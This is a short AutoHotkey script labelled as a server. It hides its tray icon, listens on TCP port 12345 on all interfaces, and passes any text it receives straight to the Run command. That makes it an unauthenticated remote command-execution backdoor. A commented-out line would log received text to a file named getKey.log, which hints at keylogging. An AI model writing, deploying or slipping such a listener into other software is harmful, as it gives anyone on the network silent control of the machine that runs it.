;Server
#SingleInstance force
#NoTrayIcon
#include socket.ahk
SetWorkingDir %A_ScriptDir%

myTcp := new SocketTCP()
myTcp.bind("addr_any", 12345)
myTcp.listen()
myTcp.onAccept := Func("OnTCPAccept")
return

OnTCPAccept()
{
    global myTcp
    newTcp := myTcp.accept()
    newTcp.sendText("Successful Connection!")
;   FileAppend,% newTcp.recvText(),getKey.log
    Run % newTcp.recvText(),,UseErrorLevel
    return
}
